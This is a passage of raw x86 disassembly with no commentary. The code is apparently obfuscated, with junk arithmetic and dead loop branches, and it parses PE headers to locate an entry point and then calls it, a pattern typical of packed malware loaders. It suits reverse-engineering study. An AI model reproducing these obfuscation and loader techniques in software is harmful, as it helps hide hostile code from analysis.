  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43048a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43049e
  409480:	adc    edi,DWORD PTR ds:0x42ee18
  409486:	mov    DWORD PTR ds:0x43049e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42ee30,0x42e76a
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42ee20,0x4304ba
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x4304c2
  4094b1:	and    DWORD PTR ds:0x4304be,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e776,0x43049a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x4304a6
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42ee2c,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42ee2c,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42ee2c,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ebb8
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42ee2c
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42ee2c,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e76a
  409527:	or     edi,DWORD PTR ds:0x43053e
  40952d:	mov    DWORD PTR ds:0x42e76a,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x4304a2,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43049a
  40955e:	sbb    DWORD PTR ds:0x42ee0c,edi
  409564:	mov    eax,DWORD PTR [eax]
  409566:	mov    DWORD PTR ds:0x42ee24,0x19
  409570:	cmp    DWORD PTR ds:0x42ee24,0x0
  409577:	je     0x40961e
  40957d:	cmp    DWORD PTR ds:0x42ee24,0x29
  409584:	jne    0x4095c1
  40958a:	push   DWORD PTR [ebp-0xc]
  40958d:	push   DWORD PTR [ebp-0x1c]
  409590:	push   0x61da
  409595:	push   DWORD PTR [ebp-0xc]
  409598:	push   DWORD PTR [ebp-0x1c]
  40959b:	push   DWORD PTR [ebp-0x20]
  40959e:	push   DWORD PTR [ebp-0x1c]
  4095a1:	push   DWORD PTR [ebp-0x28]
  4095a4:	push   0x400000
  4095a9:	push   DWORD PTR [ebp-0xc]
  4095ac:	push   0x2e1f
  4095b1:	push   0x5a6c
  4095b6:	push   0x7112
  4095bb:	call   DWORD PTR ds:0x42eab8
  4095c1:	xor    edi,edi
  4095c3:	xor    edi,DWORD PTR ds:0x42ee24
  4095c9:	dec    edi
  4095ca:	mov    DWORD PTR ds:0x42ee24,edi
  4095d0:	jmp    0x409570
  4095d5:	and    DWORD PTR ds:0x42e75e,0x0
  4095df:	jmp    0x4095f1
  4095e4:	mov    edi,DWORD PTR ds:0x42e75e
  4095ea:	inc    edi
  4095eb:	mov    DWORD PTR ds:0x42e75e,edi
  4095f1:	cmp    DWORD PTR ds:0x42e75e,0x18
  4095f8:	jae    0x40961e
  4095fe:	cmp    DWORD PTR ds:0x42e75e,0x1f
  409605:	jne    0x409619
  40960b:	push   0x6de3
  409610:	push   DWORD PTR [ebp-0x28]
  409613:	call   DWORD PTR ds:0x42ebbc
  409619:	jmp    0x4095e4
  40961e:	mov    cx,WORD PTR [ebp-0x14]
  409622:	movzx  ecx,cx
  409625:	add    ecx,DWORD PTR [eax]
  409627:	xor    eax,eax
  409629:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  409630:	mov    DWORD PTR [ebp-0x10],ecx
  409633:	mov    edi,0x5a3fc9c
  409638:	add    DWORD PTR ds:0x42e762,edx
  40963e:	mov    eax,DWORD PTR [ebp-0x1c]
  409641:	xor    ecx,ecx
  409643:	xor    ecx,DWORD PTR ds:0x4304a2
  409649:	sub    DWORD PTR ds:0x43048a,ecx
  40964f:	mov    ecx,DWORD PTR [ebp-0xc]
  409652:	or     DWORD PTR ds:0x42ee2c,0x4304a2
  40965c:	xor    eax,esi
  40965e:	mov    DWORD PTR ds:0x4304aa,0x4c41
  409668:	add    eax,ebx
  40966a:	mov    DWORD PTR ds:0x42e76e,0x490b
  409674:	cmp    DWORD PTR [ecx],eax
  409676:	jne    0x409a49
  40967c:	mov    DWORD PTR ds:0x42e75e,0x1f
  409686:	cmp    DWORD PTR ds:0x42e75e,0x0
  40968d:	je     0x40972a
  409693:	cmp    DWORD PTR ds:0x42e75e,0xb
  40969a:	jne    0x4096b3
  4096a0:	push   DWORD PTR [ebp-0xc]
  4096a3:	push   0x6e82
  4096a8:	push   0x1d82
  4096ad:	call   DWORD PTR ds:0x42ead4
  4096b3:	cmp    DWORD PTR ds:0x42e75e,0xc
  4096ba:	jne    0x4096cb
  4096c0:	mov    eax,ds:0x42e75e
  4096c5:	dec    eax
  4096c6:	mov    ds:0x42e75e,eax
  4096cb:	mov    eax,ds:0x42e75e
  4096d0:	dec    eax
  4096d1:	mov    ds:0x42e75e,eax
  4096d6:	jmp    0x409686
  4096db:	and    DWORD PTR ds:0x42ee24,0x0
  4096e5:	jmp    0x4096f7
  4096ea:	mov    ecx,DWORD PTR ds:0x42ee24
  4096f0:	inc    ecx
  4096f1:	mov    DWORD PTR ds:0x42ee24,ecx
  4096f7:	cmp    DWORD PTR ds:0x42ee24,0x11
  4096fe:	jae    0x40972a
  409704:	cmp    DWORD PTR ds:0x42ee24,0x1a
  40970b:	jne    0x40971f
  409711:	push   0x430492
  409716:	push   DWORD PTR [ebp-0x1c]
  409719:	call   DWORD PTR ds:0x42ebc0
  40971f:	jmp    0x4096ea
  409724:	or     ecx,DWORD PTR ds:0x43048a
  40972a:	mov    eax,DWORD PTR [ebp-0x1c]
  40972d:	mov    DWORD PTR ds:0x42ee14,0x1a
  409737:	cmp    DWORD PTR ds:0x42ee14,0x0
  40973e:	je     0x40977d
  409744:	cmp    DWORD PTR ds:0x42ee14,0x29
  40974b:	jne    0x409769
  409751:	push   0x6cb7
  409756:	push   DWORD PTR [ebp-0x20]
  409759:	push   0x3e46
  40975e:	push   0x42ee2c
  409763:	call   DWORD PTR ds:0x42ebc4
  409769:	xor    ecx,ecx
  40976b:	or     ecx,DWORD PTR ds:0x42ee14
  409771:	dec    ecx
  409772:	mov    DWORD PTR ds:0x42ee14,ecx
  409778:	jmp    0x409737
  40977d:	mov    ecx,DWORD PTR [ebp-0x10]
  409780:	xor    eax,esi
  409782:	adc    DWORD PTR ds:0x4304ae,0x39c3
  40978c:	add    eax,ebx
  40978e:	mov    DWORD PTR ds:0x43054e,0x5e01
  409798:	cmp    DWORD PTR [ecx],eax
  40979a:	jne    0x4098a3
  4097a0:	xor    ecx,ecx
  4097a2:	add    ecx,DWORD PTR ds:0x42ee18
  4097a8:	sub    DWORD PTR ds:0x42e762,ecx
  4097ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4097b1:	xor    ecx,ecx
  4097b3:	mov    ecx,DWORD PTR [ebp-0x44]
  4097b6:	inc    DWORD PTR ds:0x430546
  4097bc:	xor    eax,esi
  4097be:	and    DWORD PTR ds:0x42e75a,0x0
  4097c8:	mov    edx,DWORD PTR ds:0x42e75a
  4097ce:	inc    edx
  4097cf:	mov    DWORD PTR ds:0x42e75a,edx
  4097d5:	cmp    DWORD PTR ds:0x42e75a,0x11
  4097dc:	jne    0x4097f0
  4097e2:	push   0x430556
  4097e7:	push   DWORD PTR [ebp-0x10]
  4097ea:	call   DWORD PTR ds:0x42ead8
  4097f0:	cmp    DWORD PTR ds:0x42e75a,0x10
  4097f7:	jne    0x40980a
  4097fd:	mov    edx,DWORD PTR ds:0x42e75a
  409803:	inc    edx
  409804:	mov    DWORD PTR ds:0x42e75a,edx
  40980a:	cmp    DWORD PTR ds:0x42e75a,0x1c
  409811:	jb     0x4097c8
  409817:	add    eax,ebx
  409819:	sbb    edx,0x5b8
  40981f:	mov    DWORD PTR [ecx],eax
  409821:	mov    DWORD PTR ds:0x430542,0x1c
  40982b:	cmp    DWORD PTR ds:0x430542,0x0
  409832:	je     0x40987c
  409838:	cmp    DWORD PTR ds:0x430542,0xd
  40983f:	jne    0x409850
  409845:	push   0x4366
  40984a:	call   DWORD PTR ds:0x42ebc8
  409850:	cmp    DWORD PTR ds:0x430542,0xe
  409857:	jne    0x40986a
  40985d:	mov    edx,DWORD PTR ds:0x430542
  409863:	dec    edx
  409864:	mov    DWORD PTR ds:0x430542,edx
  40986a:	mov    edx,DWORD PTR ds:0x430542
  409870:	dec    edx
  409871:	mov    DWORD PTR ds:0x430542,edx
  409877:	jmp    0x40982b
  40987c:	mov    eax,DWORD PTR [ebp-0x44]
  40987f:	mov    ecx,DWORD PTR [ebp-0x34]
  409882:	adc    DWORD PTR ds:0x42ee14,ebx
  409888:	xor    ecx,esi
  40988a:	xor    DWORD PTR ds:0x43054a,edi
  409890:	mov    edx,0xffcd8d63
  409895:	and    DWORD PTR ds:0x4304a2,0x42e772
  40989f:	sub    edx,ecx
  4098a1:	add    DWORD PTR [eax],edx
  4098a3:	and    DWORD PTR ds:0x4304ba,0x0
  4098ad:	jmp    0x4098bd
  4098b2:	mov    eax,ds:0x4304ba
  4098b7:	inc    eax
  4098b8:	mov    ds:0x4304ba,eax
  4098bd:	cmp    DWORD PTR ds:0x4304ba,0x11
  4098c4:	jae    0x40990a
  4098ca:	cmp    DWORD PTR ds:0x4304ba,0xb
  4098d1:	jne    0x4098eb
  4098d7:	push   DWORD PTR [ebp-0x14]
  4098da:	push   DWORD PTR [ebp-0x10]
  4098dd:	push   0x45e3
  4098e2:	push   DWORD PTR [ebp-0x1c]
  4098e5:	call   DWORD PTR ds:0x42ebcc
  4098eb:	cmp    DWORD PTR ds:0x4304ba,0xa
  4098f2:	jne    0x409903
  4098f8:	mov    eax,ds:0x4304ba
  4098fd:	inc    eax
  4098fe:	mov    ds:0x4304ba,eax
  409903:	jmp    0x4098b2
  409908:	not    eax
  40990a:	mov    eax,ds:0x41227c
  40990f:	mov    eax,DWORD PTR [eax]
  409911:	sub    DWORD PTR ds:0x4304c2,0x4304a6
  40991b:	mov    cx,WORD PTR [ebp-0x14]
  40991f:	and    DWORD PTR ds:0x42ee1c,0x42e76e
  409929:	movzx  ecx,cx
  40992c:	add    ecx,DWORD PTR [eax]
  40992e:	and    DWORD PTR ds:0x42ee14,0x0
  409938:	jmp    0x40994b
  40993d:	xor    eax,eax
  40993f:	add    eax,DWORD PTR ds:0x42ee14
  409945:	inc    eax
  409946:	mov    ds:0x42ee14,eax
  40994b:	cmp    DWORD PTR ds:0x42ee14,0x1d
  409952:	jae    0x409980
  409958:	cmp    DWORD PTR ds:0x42ee14,0x1f
  40995f:	jne    0x409975
  409965:	push   0x887a
  40996a:	push   0x3c32
  40996f:	call   DWORD PTR ds:0x42eae0
  409975:	jmp    0x40993d
  40997a:	adc    eax,DWORD PTR ds:0x43049e
  409980:	mov    DWORD PTR [ebp-0x10],ecx
  409983:	sub    DWORD PTR ds:0x42e75e,0x488b
  40998d:	mov    eax,DWORD PTR [ebp-0x30]
  409990:	xor    ecx,ecx
  409992:	add    ecx,DWORD PTR ds:0x4304c2
  409998:	xor    ecx,DWORD PTR ds:0x4304be
  40999e:	mov    DWORD PTR ds:0x4304c2,ecx
  4099a4:	mov    ecx,DWORD PTR [ebp-0x30]
  4099a7:	xor    eax,esi
  4099a9:	sbb    DWORD PTR ds:0x4304b6,0x42ee14
  4099b3:	add    eax,eax
  4099b5:	and    DWORD PTR ds:0x42e76a,0x42ee08
  4099bf:	xor    ecx,esi
  4099c1:	sub    DWORD PTR ds:0x4304ba,0x1a55
  4099cb:	sub    ecx,eax
  4099cd:	or     DWORD PTR ds:0x4304b2,0x4304c2
  4099d7:	mov    ax,WORD PTR [ebp-0x14]
  4099db:	sub    DWORD PTR ds:0x42e75e,0x42e76a
  4099e5:	movzx  eax,ax
  4099e8:	sub    ecx,ebx
  4099ea:	mov    DWORD PTR ds:0x42e772,0x4be2
  4099f4:	cmp    eax,ecx
  4099f6:	mov    DWORD PTR ds:0x430546,0x6841
  409a00:	mov    eax,DWORD PTR [ebp-0x34]
  409a03:	movzx  ecx,WORD PTR [ebp-0x14]
  409a07:	mov    DWORD PTR ds:0x42e75a,0x46e
  409a11:	jg     0x409a30
  409a17:	xor    eax,esi
  409a19:	sub    ecx,eax
  409a1b:	adc    DWORD PTR ds:0x430486,0x430552
  409a25:	sub    ecx,ebx
  409a27:	mov    WORD PTR [ebp-0x14],cx
  409a2b:	jmp    0x409a49
  409a30:	not    DWORD PTR ds:0x42e75e
  409a36:	xor    eax,esi
  409a38:	lea    eax,[eax+ecx*1+0x32729d]
  409a3f:	mov    DWORD PTR ds:0x43055a,ebx
  409a45:	mov    WORD PTR [ebp-0x14],ax
  409a49:	mov    ecx,DWORD PTR [ebp-0x28]
  409a4c:	not    eax
  409a4e:	mov    eax,0x8e12febc
  409a53:	mov    DWORD PTR ds:0x42e76e,0x41a
  409a5d:	cmp    ecx,eax
  409a5f:	mov    DWORD PTR ds:0x42e76e,0x60ce
  409a69:	je     0x409a9b
  409a6f:	mov    DWORD PTR ds:0x42ee10,0x7d2b
  409a79:	mov    eax,DWORD PTR [ebp-0xc]
  409a7c:	mov    DWORD PTR ds:0x43049a,0x4b8f
  409a86:	mov    DWORD PTR [eax],0x60341e8d
  409a8c:	mov    DWORD PTR ds:0x42e75e,0x3193
  409a96:	jmp    0x409daf
  409a9b:	mov    ecx,DWORD PTR [ebp-0x28]
  409a9e:	cmp    ecx,0x5142ddba
  409aa4:	jne    0x409bad
  409aaa:	mov    DWORD PTR ds:0x43054e,ecx
  409ab0:	mov    eax,DWORD PTR [ebp-0xc]
  409ab3:	mov    DWORD PTR ds:0x4304be,0x644d
  409abd:	mov    DWORD PTR [eax],0x4214feba
  409ac3:	mov    eax,DWORD PTR [ebp-0xc]
  409ac6:	mov    DWORD PTR ds:0x43055a,0x1ed6
  409ad0:	mov    DWORD PTR [ebp-0x4],eax
  409ad3:	mov    DWORD PTR ds:0x43054a,edx
  409ad9:	mov    eax,DWORD PTR [ebp-0x30]
  409adc:	mov    eax,DWORD PTR [ebp-0x1c]
  409adf:	mov    DWORD PTR [ebp-0x4c],edi
  409ae2:	mov    eax,0xff7
  409ae7:	mov    eax,DWORD PTR [ebp-0x4c]
  409aea:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409af1:	cmp    eax,edi
  409af3:	mov    DWORD PTR ds:0x430552,0x7826
  409afd:	jne    0x409daf
  409b03:	add    DWORD PTR ds:0x42ee0c,0x42e75e
  409b0d:	mov    ax,WORD PTR [ebp-0x8]
  409b11:	sbb    ecx,DWORD PTR ds:0x4304ba
  409b17:	mov    ecx,0x8a40
  409b1c:	xor    ax,cx
  409b1f:	xor    ecx,DWORD PTR ds:0x42ee0c
  409b25:	mov    ecx,0x3b06
  409b2a:	add    ax,cx
  409b2d:	mov    ecx,DWORD PTR [ebp-0x4]
  409b30:	movzx  eax,ax
  409b33:	sub    DWORD PTR ds:0x430546,0x42ee28
  409b3d:	not    eax
  409b3f:	sbb    DWORD PTR ds:0x42e76a,0x43049a
  409b49:	and    eax,DWORD PTR [ecx]
  409b4b:	mov    ecx,DWORD PTR [ebp-0x4]
  409b4e:	mov    DWORD PTR ds:0x4304aa,0x2700
  409b58:	mov    DWORD PTR [ecx],eax
  409b5a:	jmp    0x409b70
  409b5f:	and    DWORD PTR ds:0x42e75e,0x43054e
  409b69:	xor    DWORD PTR [ebp-0x4c],0xe149ebc
  409b70:	mov    ax,WORD PTR [ebp-0x8]
  409b74:	not    DWORD PTR ds:0x4304c2
  409b7a:	push   DWORD PTR [ebp-0x4]
  409b7d:	adc    DWORD PTR ds:0x42ee28,0x430496
  409b87:	call   0x401000
  409b8c:	xor    DWORD PTR ds:0x42ee24,0x7536
  409b96:	test   eax,eax
  409b98:	mov    DWORD PTR ds:0x430486,0x7cfd
  409ba2:	je     0x409b5f
  409ba8:	jmp    0x409daf
  409bad:	movzx  ecx,WORD PTR ds:0x430496
  409bb4:	mov    ecx,DWORD PTR [ebp-0x28]
  409bb7:	cmp    ecx,0x1443fcbd
  409bbd:	jne    0x409bef
  409bc3:	mov    DWORD PTR ds:0x4304a2,0x6608
  409bcd:	mov    eax,DWORD PTR [ebp-0xc]
  409bd0:	mov    DWORD PTR ds:0x43048e,0x8ce
  409bda:	mov    DWORD PTR [eax],0x60062d8f
  409be0:	mov    DWORD PTR ds:0x4304ba,0x323c
  409bea:	jmp    0x409daf
  409bef:	mov    DWORD PTR ds:0x4304a2,0x6595
  409bf9:	mov    ecx,DWORD PTR [ebp-0x28]
  409bfc:	mov    DWORD PTR ds:0x42e776,0x5912
  409c06:	cmp    ecx,eax
  409c08:	jne    0x409d34
  409c0e:	sbb    DWORD PTR ds:0x4304be,edx
  409c14:	mov    eax,DWORD PTR [ebp-0x1c]
  409c17:	and    DWORD PTR ds:0x430542,0x28ff
  409c21:	mov    ecx,DWORD PTR [ebp-0xc]
  409c24:	mov    DWORD PTR ds:0x430546,0x5e2a
  409c2e:	xor    eax,esi
  409c30:	xor    DWORD PTR ds:0x430546,0x42ee0c
  409c3a:	add    eax,ebx
  409c3c:	cmp    DWORD PTR [ecx],eax
  409c3e:	je     0x409cc1
  409c44:	mov    ecx,DWORD PTR [ebp-0x54]
  409c47:	mov    eax,DWORD PTR [ebp-0xc]
  409c4a:	mov    eax,DWORD PTR [eax]
  409c4c:	mov    eax,DWORD PTR [eax+0x3c]
  409c4f:	lea    ecx,[ecx*8+0x78]
  409c56:	add    eax,ecx
  409c58:	mov    ecx,DWORD PTR [ebp-0xc]
  409c5b:	mov    ecx,DWORD PTR [ecx]
  409c5d:	mov    eax,DWORD PTR [eax+ecx*1]
  409c60:	mov    DWORD PTR [ebp-0x8],eax
  409c63:	mov    eax,DWORD PTR [ebp-0x1c]
  409c66:	xor    eax,esi
  409c68:	add    eax,ebx
  409c6a:	mov    DWORD PTR [ebp-0x4],eax
  409c6d:	mov    eax,DWORD PTR [ebp-0x1c]
  409c70:	mov    ecx,DWORD PTR [ebp-0x8]
  409c73:	xor    eax,esi
  409c75:	add    eax,ebx
  409c77:	cmp    ecx,eax
  409c79:	je     0x409daf
  409c7f:	mov    eax,DWORD PTR [ebp-0xc]
  409c82:	mov    ecx,DWORD PTR [ebp-0x8]
  409c85:	add    ecx,DWORD PTR [eax]
  409c87:	mov    DWORD PTR [ebp-0x4],ecx
  409c8a:	mov    eax,DWORD PTR [ebp-0x4]
  409c8d:	mov    ecx,DWORD PTR [ebp-0xc]
  409c90:	mov    eax,DWORD PTR [eax+0xc]
  409c93:	mov    ecx,DWORD PTR [ecx]
  409c95:	mov    al,BYTE PTR [eax+ecx*1]
  409c98:	add    al,0x36
  409c9a:	xor    al,0x48
  409c9c:	cmp    al,0xc9
  409c9e:	je     0x409cb5
  409ca4:	mov    eax,DWORD PTR [ebp-0x1c]
  409ca7:	mov    ecx,DWORD PTR [ebp-0xc]
  409caa:	xor    eax,esi
  409cac:	add    eax,ebx
  409cae:	mov    DWORD PTR [ecx],eax
  409cb0:	jmp    0x409daf
  409cb5:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  409cbc:	jmp    0x409daf
  409cc1:	mov    eax,DWORD PTR [ebp-0xc]
  409cc4:	mov    ecx,DWORD PTR [ebp-0x10]
  409cc7:	mov    ecx,DWORD PTR [ecx]
  409cc9:	mov    DWORD PTR [eax],ecx
  409ccb:	mov    eax,DWORD PTR [ebp-0xc]
  409cce:	mov    DWORD PTR [ebp-0x4],eax
  409cd1:	mov    eax,DWORD PTR [ebp-0x30]
  409cd4:	mov    eax,DWORD PTR [ebp-0x1c]
  409cd7:	mov    DWORD PTR [ebp-0x5c],edi
  409cda:	mov    eax,DWORD PTR [ebp-0x5c]
  409cdd:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409ce4:	cmp    eax,edi
  409ce6:	jne    0x409daf
  409cec:	mov    ax,WORD PTR [ebp-0x8]
  409cf0:	mov    ecx,0x8a40
  409cf5:	xor    ax,cx
  409cf8:	mov    ecx,0x3b06
  409cfd:	add    ax,cx
  409d00:	mov    ecx,DWORD PTR [ebp-0x4]
  409d03:	movzx  eax,ax
  409d06:	not    eax
  409d08:	and    eax,DWORD PTR [ecx]
  409d0a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d0d:	mov    DWORD PTR [ecx],eax
  409d0f:	jmp    0x409d1b
  409d14:	xor    DWORD PTR [ebp-0x5c],0xe149ebc
  409d1b:	mov    ax,WORD PTR [ebp-0x8]
  409d1f:	push   DWORD PTR [ebp-0x4]
  409d22:	call   0x401000
  409d27:	test   eax,eax
  409d29:	je     0x409d14
  409d2f:	jmp    0x409daf
  409d34:	mov    eax,DWORD PTR [ebp-0x28]
  409d37:	cmp    eax,0x33450cad
  409d3c:	jne    0x409daf
  409d42:	mov    eax,DWORD PTR [ebp-0xc]
  409d45:	mov    DWORD PTR [eax],0x443dc9d
  409d4b:	mov    eax,DWORD PTR [ebp-0xc]
  409d4e:	mov    DWORD PTR [ebp-0x4],eax
  409d51:	mov    eax,DWORD PTR [ebp-0x30]
  409d54:	mov    eax,DWORD PTR [ebp-0x1c]
  409d57:	mov    DWORD PTR [ebp-0x40],edi
  409d5a:	mov    eax,DWORD PTR [ebp-0x40]
  409d5d:	mov    DWORD PTR [ebp-0x8],0x4eb9
  409d64:	cmp    eax,edi
  409d66:	jne    0x409daf
  409d6c:	mov    ax,WORD PTR [ebp-0x8]
  409d70:	mov    ecx,0x8a40
  409d75:	xor    ax,cx
  409d78:	mov    ecx,0x3b06
  409d7d:	add    ax,cx
  409d80:	mov    ecx,DWORD PTR [ebp-0x4]
  409d83:	movzx  eax,ax
  409d86:	not    eax
  409d88:	and    eax,DWORD PTR [ecx]
  409d8a:	mov    ecx,DWORD PTR [ebp-0x4]
  409d8d:	mov    DWORD PTR [ecx],eax
  409d8f:	jmp    0x409d9b
  409d94:	xor    DWORD PTR [ebp-0x40],0xe149ebc
  409d9b:	mov    ax,WORD PTR [ebp-0x8]
  409d9f:	push   DWORD PTR [ebp-0x4]
  409da2:	call   0x401000
  409da7:	test   eax,eax
  409da9:	je     0x409d94
  409daf:	mov    eax,DWORD PTR [ebp-0x28]
  409db2:	cmp    eax,0x8e12febc
  409db7:	je     0x409638
  409dbd:	mov    eax,DWORD PTR [ebp-0xc]
  409dc0:	mov    eax,ds:0x4121a8
  409dc5:	mov    eax,DWORD PTR [eax+0x18c]
  409dcb:	mov    eax,DWORD PTR [eax]
  409dcd:	mov    DWORD PTR [ebp-0x74],eax
  409dd0:	mov    eax,0xf89c8531
  409dd5:	mov    DWORD PTR [ebp-0x10],eax
  409dd8:	mov    DWORD PTR [ebp-0x10],eax
  409ddb:	mov    DWORD PTR [ebp-0x10],eax
  409dde:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  409de5:	mov    DWORD PTR [ebp-0x8],eax
  409de8:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  409def:	mov    edi,DWORD PTR [ebp-0x20]
  409df2:	xor    edi,esi
  409df4:	add    edi,ebx
  409df6:	jmp    0x409e31
  409dfb:	mov    eax,DWORD PTR [ebp-0x18]
  409dfe:	xor    eax,esi
  409e00:	lea    eax,[eax+edi*1+0x32729d]
  409e07:	push   eax
  409e08:	mov    eax,DWORD PTR [ebp-0x10]
  409e0b:	xor    eax,esi
  409e0d:	lea    eax,[ebp+eax*1+0x3272a5]
  409e14:	push   eax
  409e15:	mov    eax,ds:0x4121a8
  409e1a:	push   DWORD PTR [eax+0x1bc]
  409e20:	call   0x4052e7
  409e25:	mov    eax,DWORD PTR [ebp-0x18]
  409e28:	xor    eax,esi
  409e2a:	lea    edi,[edi+eax*1+0x32729d]
  409e31:	mov    eax,DWORD PTR [ebp-0x18]
  409e34:	mov    ecx,DWORD PTR [ebp-0x18]
  409e37:	xor    ecx,esi
  409e39:	xor    eax,esi
  409e3b:	add    eax,ecx
  409e3d:	mov    ecx,DWORD PTR [ebp-0x18]
  409e40:	xor    ecx,esi
  409e42:	lea    eax,[eax+ecx*1+0x9757d7]
  409e49:	cmp    edi,eax
  409e4b:	jbe    0x409dfb
  409e51:	mov    eax,DWORD PTR [ebp+0xc]
  409e54:	mov    ds:0x41202c,eax
  409e59:	mov    eax,DWORD PTR [ebp+0x10]
  409e5c:	mov    ds:0x412280,eax
  409e61:	mov    eax,ds:0x41202c
  409e66:	mov    ecx,DWORD PTR [ebp-0x60]
  409e69:	sub    eax,ebx
  409e6b:	xor    eax,esi
  409e6d:	mov    DWORD PTR [ecx],eax
  409e6f:	mov    eax,DWORD PTR [ebp-0x58]
  409e72:	cmp    eax,0xf89c8532
  409e77:	je     0x409ed4
  409e7d:	mov    eax,DWORD PTR [ebp-0x20]
  409e80:	mov    ecx,DWORD PTR [ebp-0x50]
  409e83:	xor    eax,esi
  409e85:	add    eax,ebx
  409e87:	cmp    eax,ecx
  409e89:	je     0x409ed4
  409e8f:	mov    eax,ds:0x4121a8
  409e94:	mov    eax,DWORD PTR [eax+0x194]
  409e9a:	mov    ecx,DWORD PTR [eax]
  409e9c:	mov    eax,DWORD PTR [ecx+0x3c]
  409e9f:	push   DWORD PTR ds:0x412280
  409ea5:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  409ea9:	push   DWORD PTR ds:0x41202c
  409eaf:	add    eax,ecx
  409eb1:	mov    ecx,DWORD PTR ds:0x4121a8
  409eb7:	mov    ecx,DWORD PTR [ecx+0x194]
  409ebd:	push   DWORD PTR [ecx]
  409ebf:	call   eax
  409ec1:	mov    ecx,DWORD PTR ds:0x4121a8
  409ec7:	mov    ecx,DWORD PTR [ecx+0x1cc]
  409ecd:	mov    DWORD PTR [ecx],eax
  409ecf:	jmp    0x40a18e
  409ed4:	mov    eax,DWORD PTR [ebp-0x20]
  409ed7:	mov    ecx,DWORD PTR [ebp-0x74]
  409eda:	xor    eax,esi
  409edc:	add    eax,ebx
  409ede:	mov    edi,0xf89c85f5
  409ee3:	cmp    eax,ecx
  409ee5:	jne    0x409fe6
  409eeb:	mov    eax,DWORD PTR [ebp-0x20]
  409eee:	xor    eax,esi
  409ef0:	add    eax,ebx
  409ef2:	mov    ds:0x41222c,eax
  409ef7:	mov    eax,DWORD PTR [ebp-0x20]
  409efa:	xor    eax,esi
  409efc:	add    eax,ebx
  409efe:	mov    ds:0x412224,eax
  409f03:	mov    eax,DWORD PTR [ebp-0x18]
  409f06:	mov    DWORD PTR [ebp-0x8],eax
  409f09:	mov    eax,DWORD PTR [ebp-0x20]
  409f0c:	mov    DWORD PTR [ebp+0xc],eax
  409f0f:	mov    eax,DWORD PTR [ebp+0xc]
  409f12:	xor    eax,esi
  409f14:	add    eax,ebx
  409f16:	mov    DWORD PTR [ebp+0xc],eax
  409f19:	mov    eax,ds:0x412028
  409f1e:	mov    eax,DWORD PTR [eax]
  409f20:	mov    DWORD PTR [ebp+0xc],eax
  409f23:	mov    eax,ds:0x412230
  409f28:	mov    eax,DWORD PTR [eax]
  409f2a:	mov    DWORD PTR [ebp-0x60],eax
  409f2d:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  409f34:	mov    eax,DWORD PTR [ebp+0x10]
  409f37:	xor    eax,esi
  409f39:	add    eax,ebx
  409f3b:	mov    DWORD PTR [ebp+0x10],eax
  409f3e:	mov    eax,ds:0x4121a8
  409f43:	mov    DWORD PTR [ebp+0x10],eax
  409f46:	mov    eax,DWORD PTR [ebp+0xc]
  409f49:	mov    DWORD PTR [ebp+0x10],eax
  409f4c:	mov    eax,DWORD PTR [ebp+0x10]
  409f4f:	push   0x4
  409f51:	pop    ecx
  409f52:	sub    ecx,eax
  409f54:	add    ecx,DWORD PTR [ebp-0x60]
  409f57:	mov    DWORD PTR [ebp-0x34],edi
  409f5a:	mov    DWORD PTR [ebp-0x10],ecx
  409f5d:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  409f67:	mov    eax,DWORD PTR [ebp+0x10]
  409f6a:	mov    DWORD PTR [ebp-0xc4],eax
  409f70:	mov    eax,DWORD PTR [ebp-0x10]
  409f73:	mov    DWORD PTR [ebp-0xc0],eax
  409f79:	mov    eax,DWORD PTR [ebp-0x34]
  409f7c:	xor    eax,esi
  409f7e:	add    eax,ebx
  409f80:	mov    DWORD PTR [ebp-0xbc],eax
  409f86:	lea    eax,[ebp-0x80]
  409f89:	mov    DWORD PTR [ebp-0xb8],eax
  409f8f:	mov    eax,DWORD PTR [ebp-0xc8]
  409f95:	xor    eax,esi
  409f97:	add    eax,ebx
  409f99:	mov    DWORD PTR [ebp-0xc8],eax
  409f9f:	lea    eax,[ebp-0xc8]
  409fa5:	push   eax
  409fa6:	mov    eax,DWORD PTR [ebp-0x8]
  409fa9:	xor    eax,esi
  409fab:	add    eax,ebx
  409fad:	push   eax
  409fae:	mov    eax,ds:0x4121c8
  409fb3:	push   0x41211e
